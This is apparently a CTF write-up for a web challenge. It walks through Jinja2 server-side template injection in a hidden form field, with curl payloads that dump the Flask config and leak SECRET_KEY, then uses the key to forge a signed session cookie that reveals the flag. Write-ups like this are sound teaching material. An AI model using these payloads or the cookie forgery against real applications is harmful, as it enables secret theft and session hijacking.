# Flag Checker
Web

## Challenge 

I made this [really cool flag checker](https://flag_checker.tjctf.org/)! The only way to get in is to guess the flag because I made it super secure... at least I hope I did.

## Solution

After looking around the page, I realised there is a hidden `csrfmiddlewaretoken`.

    $ curl -s 'https://flag_checker.tjctf.org/' --data "flag=&csrfmiddlewaretoken=HELLOWORLD" | grep csrfmiddlewaretoken
            <input type="hidden" name="csrfmiddlewaretoken" value="HELLOWORLD" />

And trying out some different text injection payloads, I found out Jinja2 `{{ 7*'7' }}` will show us this

	$ curl -s 'https://flag_checker.tjctf.org/' --data "flag=&csrfmiddlewaretoken={{ 7*'7' }}" | grep csrfmiddlewaretoken

        <input type="hidden" name="csrfmiddlewaretoken" value="7777777" />

This is a Jinja Flask Template Injection

References:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection
- https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
- http://flask.pocoo.org/docs/1.0/templating/#standard-context

---

Trying out different payloads

    {{url_for.__globals__}}
    {{url_for.__globals__.os.__dict__}}
    {{request.url[23:]}}
    {{config}}

And then I realised that {{config}} has something interesting


    $ curl 'https://flag_checker.tjctf.org/' --data "flag=&csrfmiddlewaretoken={{config}}"

    <input type="hidden" name="csrfmiddlewaretoken" value="&lt;Config {&#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;SERVER_NAME&#39;: None, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;DEBUG&#39;: False, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;SECRET_KEY&#39;: b&#39;\xd2zX\xe6|S\x90\xc3xi\x88l\x18\xe6zP&#39;, &#39;ENV&#39;: &#39;production&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;USE_X_SENDFILE&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;TESTING&#39;: False, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;JSON_SORT_KEYS&#39;: True, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None}&gt;" />

Look carefully, there is a 'SECRET_KEY' entry. Select it

    $ curl 'https://flag_checker.tjctf.org/' --data "flag=&csrfmiddlewaretoken={{config['SECRET_KEY']}}"

    <input type="hidden" name="csrfmiddlewaretoken" value="b&#39;\x8eW^\xf6,\x10HW\xe1\xa9\x9f\xc8\xa7\xbd\x9ew&#39;" />

And we retrieved the key

    SECRET_KEY = '\xd2zX\xe6|S\x90\xc3xi\x88l\x18\xe6zP'

Now, if we do a curl -v, we can see a cookie..

    $ curl -v 'https://flag_checker.tjctf.org/' --data "flag=&csrfmiddlewaretoken={{config['SECRET_KEY']}}"
    < set-cookie: session=eyJoYXNfZmxhZyI6ZmFsc2V9.XKnI9A.vNOsL9z4Zc1QwuRbeQjrxKd9UyA; HttpOnly; Path=/

With the secret_key, we are able to decode and re-encode the session cookie:

References:
- https://stackoverflow.com/a/27287455
- https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key?lq=1
- https://terryvogelsang.tech/MITRECTF2018-my-flask-app/

---

Using this [Github Gist by @aescalana](https://gist.github.com/aescalana/7e0bc39b95baa334074707f73bc64bfe)

Decode the cookie using this code

    secret = '\xd2zX\xe6|S\x90\xc3xi\x88l\x18\xe6zP'
    cookie = "eyJoYXNfZmxhZyI6ZmFsc2V9.XKnI9A.vNOsL9z4Zc1QwuRbeQjrxKd9UyA"
    session = decodeFlaskCookie(secret, cookie)
    print 'Decoded original cookie:', session

This prints the following

    $ python cookie_decode.py 
    Decoded original cookie: {u'has_flag': False}

Now, we modify the session cookie to get the flag using this code

    session['has_flag'] = True
    cookie = encodeFlaskCookie(secret, session)
    print 'Decoded new cookie:', decodeFlaskCookie(secret, cookie)
    print 'New cookie:', cookie

This prints our modified cookie

    $ python cookie_decode.py 
    Decoded original cookie: {u'has_flag': False}
    Decoded new cookie: {u'has_flag': True}
    New cookie: eyJoYXNfZmxhZyI6dHJ1ZX0.XKnKvg.kr7eaxh9wJayZLy-txEPm148bw0

Pass the cookie to the server and we get the flag!


    $ curl 
        -v 'https://flag_checker.tjctf.org/'
        --data "flag=a"
        --cookie "session=eyJoYXNfZmxhZyI6dHJ1ZX0.XKnKMQ.PkbXcTzvyG3A-L6DFIm3nVDfatM"
    
    <p class="lead">
        How did you guess that it was tjctf{t3mpl4te_inj3ct10n_is_f4k3_n3w5}?
    </p>

## Flag

	tjctf{t3mpl4te_inj3ct10n_is_f4k3_n3w5}


Other related references:

- https://ctftime.org/writeup/11014
- https://medium.com/bugbountywriteup/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f
- https://github.com/bl4de/ctf/blob/master/2017/ASIS_CTF_2017/Golem/Golem_Web_writeup.md
- https://stackoverflow.com/questions/2877110/python-new-style-classes-and-subclasses-function
- https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-01-TokyoWesterners-CTF/README.md
- https://hexplo.it/post/escaping-the-csawctf-python-sandbox/
